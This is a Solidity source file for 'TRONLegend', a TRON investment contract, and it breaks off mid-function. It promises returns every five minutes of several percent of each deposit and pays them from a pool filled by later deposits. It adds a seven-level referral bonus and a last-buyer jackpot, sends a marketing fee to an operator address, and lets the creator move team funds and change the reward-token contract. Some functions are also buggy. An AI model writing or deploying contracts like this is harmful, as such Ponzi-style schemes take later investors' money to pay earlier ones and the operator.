//SourceUnit: tron.sol

/*
 */

pragma solidity 0.5.12;


contract queue
    {
    struct Queue {
        address payable[] data;
        uint front;
        uint rear;
    }
    
    // Queue length
    function length(Queue storage q) view internal returns (uint) {
        return q.rear - q.front;
    }
    
    // push
    function push(Queue storage q, address payable data) internal
    {
        if ((q.rear + 1) % q.data.length == q.front)
           pop(q); // throw first;
        q.data[q.rear] = data;
        q.rear = (q.rear + 1) % q.data.length;
    }
    // pop
    function pop(Queue storage q) internal returns (address r)
    {
        if (q.rear == q.front)
            revert(); // throw;
        r = q.data[q.front];
        delete q.data[q.front];
        q.front = (q.front + 1) % q.data.length;
    }
}

contract Creator {
    address payable public creator;
    /**
        @dev constructor
    */
    constructor() public {
        creator = msg.sender;
    }

    // allows execution by the creator only
    modifier creatorOnly {
        assert(msg.sender == creator);
        _;
    }
}

contract TRONLegend is Creator,queue{
    using SafeMath for uint;

    uint constant public DEPOSITS_MAX = 100;
    uint constant public INVEST_MIN_AMOUNT = 100 trx;
    uint constant public FOMO_MIN_AMOUNT = 500 trx;
    uint constant public FOMO_INCREASE_AMOUNT = 10 trx;
    uint constant public FOMO_MAX_AMOUNT = 2000 trx;
    uint constant public ACTIVE_MIN_AMOUNT = 100 trx;





    uint constant public BASE_PERCENT = 300;
    uint constant public BASE_INCREASE_PERCENT = 500;

    uint constant public INCREASE_DAY_PERCENT = 50;

    uint constant public MAX_PERCENT = 800;
    uint constant public THREE_BONUS_NUM = 699;
    uint constant public WITHDRAW_BURN = 100;

    uint constant public FOMO_NEXT_PERCENT = 3000;
    uint constant public FOMO_LASTWIN_PERCENT = 4000;
    uint constant public FOMO_OTHERWIN_PERCENT = 250;
    uint constant public FOMO_SAFE_PERCENT = 2000;




    uint constant public REBUY_PERCENT = 400;
    uint[] public REFERRAL_PERCENTS = [400, 200, 100, 50, 50, 50, 50];
    uint constant public MARKETING_FEE = 1000;
    uint constant public BONUS_FEE = 7050;
    uint constant public LEAGUE_FEE = 900;
    uint constant public END_FEE = 50;
    uint constant public FOMO_FEE = 500;
    uint constant public TEAM_FEE = 500;
    uint constant public SAFE_FEE = 200;
    uint constant rewardInternal = 4;



    uint constant public MAX_CONTRACT_PERCENT = 800;
    uint constant public MAX_HOLD_PERCENT = 500;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 100 trx;
    uint constant public FOMO_BALANCE_STEP = 10 trx;

    uint constant public TIME_STEP = 5 minutes;
    uint constant private rndMax_ = 5 minutes;                // max length a round timer can be

    uint public totalDeposits;
    uint public totalChange;

    uint public totalInvested;
    uint public totalBonus;
    uint public totalLeague;
    uint public totalTeam;
    uint public totalEnd;
    uint public totalSafeguard;
    uint public dailyDeRate;
    uint public dailyAddRate;

    uint32 public endTime;




    uint public totalWithdrawn;

    uint public contractPercent;
    uint public contractCreation;


    address payable public marketingAddress;

    uint256 public rID_; 
    uint256 private endIndex;
    uint256 private safeIndex;
    bool public activated_ = false;


    TDCCoinInterface public tdcCoin;



    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint64 refback;
        uint32 start;
        uint16 state;//rebuy
        uint16 outState;//3
    }

    struct Rate {
        uint32 start;
        uint16 rate;
        uint duration;
    }

    struct Round {
        address[] plyrs;   // pID of player in lead
        uint32 end;    // time ends/ended
        bool ended;     // has round end function been ran
        uint32 strt;   // time round started
        uint32 keys;   // keys
        uint64 pot;    // eth to pot (during round) / final amount paid to winner (after round ends)
    }

    struct safeGuard {
        bool state;
        uint32 start;
        uint duration;
    }
    struct FomoHis {
        address winner;
        uint128 winPot;
    }


    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        uint32 checkSafe;
        address referrer;
        uint64 bonus;
        uint64 balance;
        uint128 total;
        uint64 fomobonus;
        uint64 teamBonus;
        uint24[7] refs;
        bool actived;  
    }  


    mapping (address => User) internal users;
    //mapping (uint => uint) internal turnover;
    mapping (uint => Rate) public changeRate;
    mapping (uint => FomoHis) internal fomoHis;
    mapping (uint => safeGuard) internal safe;
    mapping(uint256 => Round) public round_;   // (rID => data) round data


    Queue public end100;

    modifier isActivated {
        require(activated_, "its not activated yet.");
        _;
    }

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event Withdraws(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);


    constructor(address payable marketingAddr) public {

        marketingAddress = marketingAddr;
        contractCreation = block.timestamp;
        contractPercent = getContractBalanceRate();
        end100.data.length=10;
        safeIndex=0;   

    }
    function activate() creatorOnly public
    {
        // can only be ran once
        require(!activated_, "ReserveBag already activated");

        uint _now = now;
        rID_ = 1;
        round_[1].strt = uint32(_now);
        round_[1].end = uint32(_now.add(rndMax_));
        activated_=true;

        totalChange=1;
        changeRate[totalChange].start=uint32(block.timestamp);
        changeRate[totalChange].rate=uint16(BASE_PERCENT);
        changeRate[totalChange].duration=0;
    }

    function reInvest(address referrer,uint value) public payable isActivated {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        require(value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 100 TRX");

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");

      

        uint msgValue = value;

        uint balance= getBalance();
        require(msgValue < balance, "balance is not enough");
        user.balance=uint64(balance.sub(msgValue));


    
        uint _rID = rID_;

    
        if (user.referrer == address(0)  && referrer != msg.sender) {
            user.referrer = referrer;
        }

        uint refbackAmount;
        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < 7; i++) {
                if (upline != address(0)) {
                    uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
    
                    if (amount > 0) {
                        //address(uint160(upline)).transfer(amount);
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            user.checkSafe =uint32(block.timestamp);
            emit Newbie(msg.sender);
        }
        if(msgValue>= ACTIVE_MIN_AMOUNT){
            users[msg.sender].actived=true;
            push(end100,msg.sender);
        }
        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;
        if(totalDeposits<=THREE_BONUS_NUM){
            user.deposits.push(Deposit(uint64(msgValue), 0, uint64(refbackAmount), uint32(block.timestamp),uint16(1),uint16(3)));
        }else{
            user.deposits.push(Deposit(uint64(msgValue), 0, uint64(refbackAmount), uint32(block.timestamp),1,2));
        }
    
        uint bonusFee = msgValue.mul(BONUS_FEE).div(PERCENTS_DIVIDER);
        totalBonus=bonusFee.add(totalBonus);

        if(!(block.timestamp >= uint(round_[_rID].strt) && (block.timestamp <= uint(round_[_rID].end)))) {
             if(block.timestamp > uint(round_[_rID].end)&& !round_[_rID].ended) {
                  round_[_rID].ended = true;
                  endRound();
                  _rID++;
             }    
        }
        uint FomoPrice= getFomoPrice();
        if(msgValue>= FomoPrice){
            pushFOMOInfo(msg.sender);
            updateTimer(_rID);
            round_[_rID].keys++;
        }
        uint fomoFee = msgValue.mul(FOMO_FEE).div(PERCENTS_DIVIDER);
        uint leagueFee = msgValue.mul(LEAGUE_FEE).div(PERCENTS_DIVIDER);
        uint teamFee = msgValue.mul(TEAM_FEE).div(PERCENTS_DIVIDER);

        round_[_rID].pot = uint64(uint(round_[_rID].pot).add(fomoFee));
        totalLeague =uint64(uint(totalLeague).add(leagueFee));
        totalTeam=uint64(uint(totalTeam).add(uint64(teamFee))) ;
        totalSafeguard=totalSafeguard.add(uint64(msgValue.mul(SAFE_FEE).div(PERCENTS_DIVIDER))); 
        totalEnd = totalEnd.add(uint64(msgValue.mul(END_FEE).div(PERCENTS_DIVIDER)));
    

        marketingAddress.transfer(msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
        // projectAddress.transfer(projectFee);
        tdcCoin.mint(msg.sender, msgValue.div(1000).mul(9));
        tdcCoin.mint(marketingAddress, msgValue.div(1000));

        emit NewDeposit(msg.sender, msgValue);
    }
    function invest(address referrer) public payable isActivated {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 100 TRX");
        User storage user = users[msg.sender];
        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");
        uint msgValue = msg.value;    
        uint _rID = rID_;
        // grab time
        uint _now = now;

        if (user.referrer == address(0) && referrer != msg.sender) {
            user.referrer = referrer;
        }
        uint refbackAmount;
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            for (uint i = 0; i < 7; i++) {
                if (upline != address(0)) {
                    uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    if (amount > 0) {
                        //address(uint160(upline)).transfer(amount);
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
                        users[upline].balance = uint64(uint(users[upline].balance).add(amount));
                        emit RefBonus(upline, msg.sender, i, amount);
                    }
                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }
        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            user.checkSafe =uint32(block.timestamp);
            emit Newbie(msg.sender);
        }
        if(msgValue>= ACTIVE_MIN_AMOUNT){
            users[msg.sender].actived=true;
            push(end100,msg.sender);
        }
        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;
        if(totalDeposits<=THREE_BONUS_NUM){
            user.deposits.push(Deposit(uint64(msgValue), 0, uint64(refbackAmount), uint32(block.timestamp),0,3));
        }else{
            user.deposits.push(Deposit(uint64(msgValue), 0, uint64(refbackAmount), uint32(block.timestamp),0,2));
        }
    
        uint bonusFee = msgValue.mul(BONUS_FEE).div(PERCENTS_DIVIDER);
        totalBonus=totalBonus.add(bonusFee);

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) { 
            uint contractPercentNew = getContractBalanceRate();
                if(contractPercent<contractPercentNew){
                    uint addRate=contractPercentNew.sub(contractPercent);
                    if(addRate>INCREASE_DAY_PERCENT){
                        addRate=INCREASE_DAY_PERCENT;
                    }
                    changeRate[totalChange].duration=(block.timestamp.sub(uint(changeRate[totalChange].start))).div(TIME_STEP);
                    if(changeRate[totalChange].duration>0){
                       contractPercent = contractPercent.add(addRate);
                       totalChange++;
                       changeRate[totalChange].start=uint32(block.timestamp);
                       changeRate[totalChange].rate=uint16(contractPercent);
                       changeRate[totalChange].duration=0;
                       dailyAddRate=addRate;
                    }else if(dailyAddRate<INCREASE_DAY_PERCENT){
                        dailyAddRate=dailyAddRate.add(addRate);
                        if(dailyAddRate<=INCREASE_DAY_PERCENT){
                            changeRate[totalChange].rate=uint16(uint(changeRate[totalChange].rate).add(addRate));
                        }else{
                            uint newaddRate=addRate.sub(dailyAddRate.sub(INCREASE_DAY_PERCENT));
                            changeRate[totalChange].rate=uint16(uint(changeRate[totalChange].rate).add(newaddRate));
                            dailyAddRate=INCREASE_DAY_PERCENT;
                    }
                    
                }
                }
                contractPercent=uint(changeRate[totalChange].rate);
        }
        if(!(_now >= uint(round_[_rID].strt) && (_now <= uint(round_[_rID].end)))) {
             if(_now > uint(round_[_rID].end) && !round_[_rID].ended) {
                  round_[_rID].ended = true;
                  endRound();
                  _rID++;
             }    
        }
        uint FomoPrice= getFomoPrice();
        if(msgValue>= FomoPrice){
            pushFOMOInfo(msg.sender);
            updateTimer(_rID);
            round_[_rID].keys++;
        }
        uint leagueFee = msgValue.mul(LEAGUE_FEE).div(PERCENTS_DIVIDER);
        uint teamFee = msgValue.mul(TEAM_FEE).div(PERCENTS_DIVIDER);
        uint marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        
        round_[_rID].pot = uint64(uint(round_[_rID].pot).add(msgValue.mul(FOMO_FEE).div(PERCENTS_DIVIDER)));
        totalLeague =totalLeague.add(uint64(leagueFee));
        totalTeam=totalTeam.add(uint64(teamFee)) ;
        totalSafeguard=totalSafeguard.add(uint64(msgValue.mul(SAFE_FEE).div(PERCENTS_DIVIDER))); 
        totalEnd = totalEnd.add(uint64(msgValue.mul(END_FEE).div(PERCENTS_DIVIDER)));
    
        marketingAddress.transfer(marketingFee);
        // projectAddress.transfer(projectFee);
        tdcCoin.mint(msg.sender, msgValue.div(1000).mul(9));
        tdcCoin.mint(marketingAddress, msgValue.div(1000));

        emit FeePayed(msg.sender, marketingFee);

        emit NewDeposit(msg.sender, msgValue);
    }
    function pushFOMOInfo(address player) internal {
        uint _rID = rID_;
        if(endIndex == round_[_rID].plyrs.length) {
            round_[_rID].plyrs.push(player);
        } else if(endIndex < round_[_rID].plyrs.length) {
            round_[_rID].plyrs[endIndex] = player;
        } else {
            // cannot happen
            revert();
        }

        endIndex = (endIndex + 1) % (rewardInternal + 1);
    }
     /**
     * @dev updates round timer based on number of whole keys bought.
     */
    function updateTimer(uint256 _rID) private
    {
        uint256 keyDuration = rndMax_;
        round_[_rID].end = uint32(keyDuration.add(now));
    }
     /**
     * @dev ends the round. manages paying out winner/splitting up pot
     */
    function endRound()
        private
            {
        uint _rID = rID_;
        uint _pot = round_[_rID].pot;


        // eth put to next round's pot
        uint _newPot = _pot.mul(FOMO_NEXT_PERCENT).div(PERCENTS_DIVIDER);
        uint lastWin = _pot.mul(FOMO_LASTWIN_PERCENT).div(PERCENTS_DIVIDER);
        uint otherWin = _pot.mul(FOMO_OTHERWIN_PERCENT).div(PERCENTS_DIVIDER);
        uint safeAmount = _pot.mul(FOMO_SAFE_PERCENT).div(PERCENTS_DIVIDER);
        totalSafeguard=totalSafeguard.add(safeAmount); 

        if(round_[_rID].plyrs.length>0){
            for (uint i = 1; i < round_[_rID].plyrs.length; i++){
            users[round_[_rID].plyrs[i]].fomobonus=uint64(uint(users[round_[_rID].plyrs[i]].fomobonus).add(otherWin));
            users[round_[_rID].plyrs[i]].balance=uint64(uint(users[round_[_rID].plyrs[i]].balance).add(otherWin));     
        }
        if(endIndex==0){
            users[round_[_rID].plyrs[round_[_rID].plyrs.length-1]].fomobonus=uint64(uint(users[round_[_rID].plyrs[round_[_rID].plyrs.length-1]].fomobonus).add(lastWin.sub(otherWin)));
            users[round_[_rID].plyrs[round_[_rID].plyrs.length-1]].balance=uint64(uint(users[round_[_rID].plyrs[round_[_rID].plyrs.length-1]].balance).add(lastWin.sub(otherWin)));     
            fomoHis[_rID].winner=round_[_rID].plyrs[4];
        }else{
            users[round_[_rID].plyrs[endIndex-1]].fomobonus=uint64(uint(users[round_[_rID].plyrs[endIndex-1]].fomobonus).add(lastWin.sub(otherWin)));
            users[round_[_rID].plyrs[endIndex-1]].balance=uint64(uint(users[round_[_rID].plyrs[endIndex-1]].balance).add(lastWin.sub(otherWin)));
            fomoHis[_rID].winner=round_[_rID].plyrs[endIndex-1];
        }       
        }
        fomoHis[_rID].winPot= uint128(_pot);
        // start next round
        rID_++;
        _rID++;
        round_[_rID].strt = uint32(now);
        round_[_rID].end = uint32(now.add(rndMax_));
        endIndex = 0;
        // add rest eth to next round's pot
        round_[_rID].pot = uint64(_newPot);
    
    }

    function  checkFomo() public  {
        uint _rID = rID_;
        uint _now = now;
        if(!(_now >= uint(round_[_rID].strt) && (_now <= uint(round_[_rID].end)))) {
             if(_now > uint(round_[_rID].end) && !round_[_rID].ended) {
                  round_[_rID].ended = true;
                  endRound();
                  _rID++;
             }    
        }
    }


    function  safeOpen() public creatorOnly {
        require(tx.origin == msg.sender);
        if(safeIndex==0){
            safeIndex=safeIndex.add(1);
            safe[safeIndex].state=true;
            safe[safeIndex].start=uint32(block.timestamp);
        }else if(safe[safeIndex].state){
            safe[safeIndex].state=false;
            safe[safeIndex].duration=(block.timestamp.sub(uint(safe[safeIndex].start))).div(TIME_STEP);
            }else {
                safeIndex++;
                safe[safeIndex].state=true;
                safe[safeIndex].start=uint32(block.timestamp);
            }
    }
    function  addTeam(address payable userAddress,uint value) public creatorOnly {
        require(tx.origin == msg.sender);
        User storage user = users[userAddress];
        user.teamBonus=uint64(uint(user.teamBonus).add(value));
        if(totalTeam>value){
          userAddress.transfer(value);
          totalTeam=totalTeam.sub(value);
          emit FeePayed(userAddress,value);   
        }else{
          revert();
        }
    }
    function setDRSCoinAddress(address _newDRSCoinAddress) public creatorOnly {
        tdcCoin = TDCCoinInterface(_newDRSCoinAddress);
    }
    function withdrawSafe() public isActivated{
        User storage user = users[msg.sender];
        //uint userPercentRate = getUserPercentRate(msg.sender);
        uint totalAmount;
        uint totalInvest=getUserTotalDeposits(msg.sender);
        require(totalInvest > 0, "User has no dividends");
        require(user.total < totalInvest.div(2), "User has no dividends");

        uint dailyBonus=totalInvest.mul(BASE_PERCENT).div(PERCENTS_DIVIDER);
        for(uint j=1;j<=safeIndex;j++){
          if(user.checkSafe<safe[j].start){
              totalAmount=totalAmount.add(dailyBonus.mul(uint(safe[j].duration)));
              if(safe[j].duration==0){
                            totalAmount = totalAmount.add(dailyBonus
                            .mul(block.timestamp.sub(uint(safe[j].start)))
                            .div(TIME_STEP));
                        }
          }else if(user.checkSafe>safe[safeIndex].start){
              if(safe[safeIndex].duration==0){
                            totalAmount = totalAmount.add(dailyBonus
                            .mul(block.timestamp.sub(user.checkSafe))
                            .div(TIME_STEP));
                        }
          } 

        }
        require(totalAmount > 0, "User has no dividends");

        uint contractBalance = totalSafeguard;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
            totalSafeguard=0;
        }else{
            totalSafeguard=contractBalance.sub(totalAmount);
        }

        user.total=uint128(uint(user.total).add(totalAmount));

        msg.sender.transfer(totalAmount);
        totalWithdrawn = totalWithdrawn.add(totalAmount);
        user.checkSafe =uint32(block.timestamp);

        emit Withdraws(msg.sender, totalAmount);
    }
    function withdraw() public isActivated{
        User storage user = users[msg.sender];
        uint totalAmount;
        uint dividends;         
        for (uint i = 0; i < user.deposits.length; i++) {
            uint startT=user.deposits[i].start;
            uint rate =contractPercent;
            if(uint(user.deposits[i].state)==1){
                rate=rate.add(REBUY_PERCENT);
            }
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(uint(user.deposits[i].outState))) {
                if (startT < user.checkpoint) {
                    startT=user.checkpoint;
                } 
                dividends = (uint(user.deposits[i].amount).mul(rate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(startT)))
                        .div(TIME_STEP);
                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(uint(user.deposits[i].outState))) {
                    dividends = (uint(user.deposits[i].amount).mul(uint(user.deposits[i].outState))).sub(uint(user.deposits[i].withdrawn));
                }
                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);
            }
        }

        require(totalAmount > 0, "User has no dividends");

        if (totalBonus < totalAmount) {
            totalAmount = totalBonus;
            totalBonus=0;
            endTime=uint32(block.timestamp);
        }else{
            totalBonus=totalBonus.sub(totalAmount);
        }
        if(contractPercent>=BASE_INCREASE_PERCENT){
                uint contractPercentNew = getContractBalanceRate();
                if(contractPercent>contractPercentNew){
                    uint deRate=contractPercent.sub(contractPercentNew);
                    if(deRate>INCREASE_DAY_PERCENT){
                        deRate=INCREASE_DAY_PERCENT;
                    }
                    changeRate[totalChange].duration=(block.timestamp.sub(uint(changeRate[totalChange].start))).div(TIME_STEP);
                    if(changeRate[totalChange].duration>0){
                       contractPercent = contractPercent.sub(deRate);
                       totalChange++;
                       changeRate[totalChange].start=uint32(block.timestamp);
                       changeRate[totalChange].rate=uint16(contractPercent);
                       changeRate[totalChange].duration=0;
                       dailyDeRate=deRate;
                    }else if(dailyDeRate<INCREASE_DAY_PERCENT){
                        dailyDeRate=dailyDeRate.add(deRate);
                        if(dailyDeRate<=INCREASE_DAY_PERCENT){
                            changeRate[totalChange].rate=uint16(uint(changeRate[totalChange].rate).sub(deRate));
                        }else{
                            uint newdeRate=deRate.sub(dailyDeRate.sub(INCREASE_DAY_PERCENT));
                            changeRate[totalChange].rate=uint16(uint(changeRate[totalChange].rate).sub(newdeRate));
                            dailyDeRate=INCREASE_DAY_PERCENT;
                    }
                    
                }
                }
                contractPercent=uint(changeRate[totalChange].rate);                
        }

        user.checkpoint = uint32(block.timestamp);
        totalAmount=totalAmount.add(uint(user.balance));
        user.total=uint128(uint(user.total).add(totalAmount));
        totalSafeguard = totalSafeguard.add(totalAmount.mul(WITHDRAW_BURN).div(PERCENTS_DIVIDER));
        uint avail=totalAmount.sub(totalAmount.mul(WITHDRAW_BURN).div(PERCENTS_DIVIDER));
        msg.sender.transfer(avail);
        user.balance=0;
        totalWithdrawn = totalWithdrawn.add(totalAmount);
        emit Withdrawn(msg.sender, totalAmount);
    }

    function payForEnd() public creatorOnly{
        endGame();
    }

    function endGame() private  {
         if(totalEnd>0){
             uint value=totalEnd.div(100);
             for(uint i=0;i<end100.data.length;i++){
                 end100.data[i].transfer(value);
                 totalEnd=totalEnd.sub(value);
             }
             if(totalEnd>0){
                 totalSafeguard=totalSafeguard.add(totalEnd);
             }
         }
     }

    function getBalance() internal   returns (uint){
        User storage user = users[msg.sender];
        //uint userPercentRate = getUserPercentRate(msg.sender);
        uint totalAmount;
        uint dividends;
        for (uint i = 0; i < user.deposits.length; i++) {
            uint startT=user.deposits[i].start;
            uint rate =changeRate[totalChange].rate;
            if(uint(user.deposits[i].state)==1){
                rate=rate.add(REBUY_PERCENT);
            }
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(uint(user.deposits[i].outState))) {
                if (startT < user.checkpoint) {
                    startT=user.checkpoint;
                } 
                dividends = (uint(user.deposits[i].amount).mul(rate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(startT)))
                        .div(TIME_STEP);

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(uint(user.deposits[i].outState))) {
                    dividends = (uint(user.deposits[i].amount).mul(uint(user.deposits[i].outState))).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);
            }
        }
        uint contractBalance = totalBonus;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
            totalBonus=0;
            endTime=uint32(block.timestamp);
        }else{
            totalBonus=contractBalance.sub(totalAmount);
        }
        user.checkpoint = uint32(block.timestamp);
        totalAmount=totalAmount.add(uint(user.balance));
        return totalAmount;
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getContractBalanceRate() internal view returns (uint) {
        //uint _now = now;
        uint contractBalancePercent = BASE_PERCENT.add(totalBonus.div(CONTRACT_BALANCE_STEP).mul(5));
        
        if(contractPercent>=BASE_INCREASE_PERCENT&&contractBalancePercent<=BASE_INCREASE_PERCENT){
            contractBalancePercent=BASE_INCREASE_PERCENT;
        }
        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
        
    }

    function getSafe(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint totalAmount;
        uint totalInvest=getUserTotalDeposits(msg.sender);
        
        if(user.total<totalInvest.div(2)){
            uint dailyBonus=totalInvest.mul(BASE_PERCENT).div(PERCENTS_DIVIDER);
        for(uint j=1;j<=safeIndex;j++){
          if(user.checkSafe<safe[j].start){
              totalAmount=totalAmount.add(dailyBonus.mul(uint(safe[j].duration)));
              if(safe[j].duration==0){
                            totalAmount = totalAmount.add(dailyBonus
                            .mul(block.timestamp.sub(uint(safe[j].start)))
                            .div(TIME_STEP));
                        }
          }else if(user.checkSafe>safe[safeIndex].start){
              if(safe[safeIndex].duration==0){
                            totalAmount = totalAmount.add(dailyBonus
                            .mul(block.timestamp.sub(user.checkSafe))
                            .div(TIME_STEP));
                        }
          } 

        }
        }
        return totalAmount;
    }
    function getFomoPrice() public view returns (uint) {
        uint _rID = rID_;
        uint Fomobalance = uint(round_[_rID].pot);

        if(Fomobalance <= FOMO_BALANCE_STEP.mul(3)){
            return FOMO_MIN_AMOUNT;
        }
        Fomobalance=Fomobalance.sub(FOMO_BALANCE_STEP.mul(3));
        uint currentFomoPrice = FOMO_MIN_AMOUNT.add((Fomobalance.div(FOMO_BALANCE_STEP)).mul(FOMO_INCREASE_AMOUNT));
        if (currentFomoPrice < FOMO_MAX_AMOUNT) {
            return currentFomoPrice;
        } else {
            return FOMO_MAX_AMOUNT;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        //uint userPercentRate = getUserPercentRate(msg.sender);
        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {
            uint startT=user.deposits[i].start;
            uint rate =contractPercent;
            if(uint(user.deposits[i].state)==1){
                rate=rate.add(REBUY_PERCENT);
            }
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(uint(user.deposits[i].outState))) {
                if (startT < user.checkpoint) {
                    startT=user.checkpoint;
                } 
                dividends = (uint(user.deposits[i].amount).mul(rate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(startT)))
                        .div(TIME_STEP);

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(uint(user.deposits[i].outState))) {
                    dividends = (uint(user.deposits[i].amount).mul(uint(user.deposits[i].outState))).sub(uint(user.deposits[i].withdrawn));
                }
                //user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);
            }
        }
        //totalAmount=totalAmount.add(uint(user.balance));
        return totalAmount;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];
        return (user.deposits.length > 0) && user.actived;
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn)).add(uint(user.deposits[i].refback));
        }

        return amount;
    }
    function getUserTeam(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = uint(user.teamBonus);

        return amount;
    }
    function getEnd100() public view returns (address[] memory,uint) {
        uint count=end100.data.length;
        address[] memory addr = new address[](count);
        for (uint i = 0; i < count; i++) {
            addr[i] = end100.data[i];
        }
        return (addr,count);
    }
    function getUserFomo(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = uint(user.fomobonus);

        return amount;
    }
    function getUserInviteBonus(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = uint(user.bonus);

        return amount;
    }

    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory refback = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = count; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }
    function getFomo(uint last, uint first) public view returns (uint,uint,address[] memory , uint[] memory) {

        uint _rID = rID_;
        uint fomobalance = uint(round_[_rID].pot);
        uint time ;

        if(round_[_rID].end>block.timestamp){
            time = uint(round_[_rID].end).sub(block.timestamp);
        }else{
            time=0;
        }

        uint count = first.sub(last);
        if (count > _rID) {
            count = _rID;
        }

        address[] memory winList = new address[](5);
        uint[] memory winValue = new uint[](5);
        
        for (uint i = 0; i < round_[_rID].plyrs.length; i++) {
            winList[i] = round_[_rID].plyrs[i];
            winValue[i] = uint(round_[_rID].pot).mul(FOMO_OTHERWIN_PERCENT).div(PERCENTS_DIVIDER);
        }

         if(endIndex == round_[_rID].plyrs.length&&round_[_rID].plyrs.length>0) {
            winValue[endIndex-1] = uint(round_[_rID].pot).mul(FOMO_LASTWIN_PERCENT).div(PERCENTS_DIVIDER);
        } else if(endIndex < round_[_rID].plyrs.length) {
            if(endIndex>0){
                winValue[round_[_rID].plyrs.length-1] = uint(round_[_rID].pot).mul(FOMO_LASTWIN_PERCENT).div(PERCENTS_DIVIDER);
                winList[endIndex-1] = round_[_rID].plyrs[round_[_rID].plyrs.length-1];
                winList[round_[_rID].plyrs.length-1] = round_[_rID].plyrs[endIndex-1];
            }else if(endIndex==0){
                winValue[round_[_rID].plyrs.length-1] = uint(round_[_rID].pot).mul(FOMO_LASTWIN_PERCENT).div(PERCENTS_DIVIDER);
            }
        }

       return (fomobalance,time,winList,winValue);
    }
    

    function getSiteStats() public view returns (uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, totalBonus, contractPercent);
    }
    function getFomoHis(uint last, uint first) public view returns (uint[] memory,address[] memory){
        uint _rID = rID_;
        uint count = first.sub(last);
        if (count > _rID) {
            count = _rID;
        }
        uint index = 0;
        address[] memory winner = new address[](count);
